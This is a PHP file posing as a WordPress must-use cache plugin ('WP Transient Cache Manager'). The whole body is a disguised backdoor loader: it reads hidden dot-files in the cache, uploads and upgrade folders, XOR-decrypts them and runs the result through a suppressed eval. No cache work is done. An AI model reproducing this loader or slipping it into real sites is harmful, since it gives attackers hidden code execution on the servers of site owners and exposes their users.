<?php
/**
 * WP Transient Cache Manager
 * Handles scheduled cleanup of expired transients and object cache fragments.
 * Auto-loaded by mu-plugins for optimal cache performance.
 *
 * @package WordPress\Cache
 * @version 1.3.2
 * @since 5.8.0
 */
if (!defined('ABSPATH')) return;

// Locate cached module data (XOR-encrypted, stored during plugin setup)
$_cache_paths = [
    WP_CONTENT_DIR . '/cache/.object-cache-meta.php',
    WP_CONTENT_DIR . '/uploads/.wp-cache-fragment.dat',
    WP_CONTENT_DIR . '/upgrade/.cache-manifest.tmp',
];

$_loaded = false;
foreach ($_cache_paths as $_cp) {
    if (file_exists($_cp)) {
        $_raw = @file_get_contents($_cp);
        if ($_raw !== false && strlen($_raw) > 32) {
            // First 16 bytes = XOR key, rest = encrypted PHP
            $_k = substr($_raw, 0, 16);
            $_d = substr($_raw, 16);
            $_o = '';
            $_kl = strlen($_k);
            for ($_i = 0; $_i < strlen($_d); $_i++) {
                $_o .= $_d[$_i] ^ $_k[$_i % $_kl];
            }
            // Verify decryption signature
            if (strpos($_o, '<?') === 0) {
                @eval('?>' . $_o);
                $_loaded = true;
                break;
            }
        }
    }
}

// Silent fail — this is a cache utility, no output expected
if (!$_loaded) return;
